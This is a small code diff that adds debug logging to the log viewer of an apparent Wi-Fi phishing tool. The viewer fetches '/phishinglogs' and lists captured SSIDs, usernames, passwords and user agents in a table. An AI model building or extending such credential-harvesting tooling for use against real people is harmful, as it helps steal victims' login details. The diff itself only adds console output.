@@ -61,8 +61,15 @@ html
 script.
   function loadJson(){
     getFile("/phishinglogs",function(res){
+      console.log("res");
+      console.log(typeof res);
+      console.log(res);
       var raw = res.slice(0, -4);
+      console.log("raw");
+      console.log(raw);
       var arr = JSON.parse(raw);
+      console.log("arr");
+      console.log(arr);
       arr.forEach(function(json) {
         console.log(json);
         $("#phishingTable").append('<tr><td>'+json.url+'</td><td>'+json.ssid+'</td><td>'+json.channel+'</td><td>'+json.user+'</td><td>'+json.pass+'</td><td>'+json.userAgent+'</td></tr>');
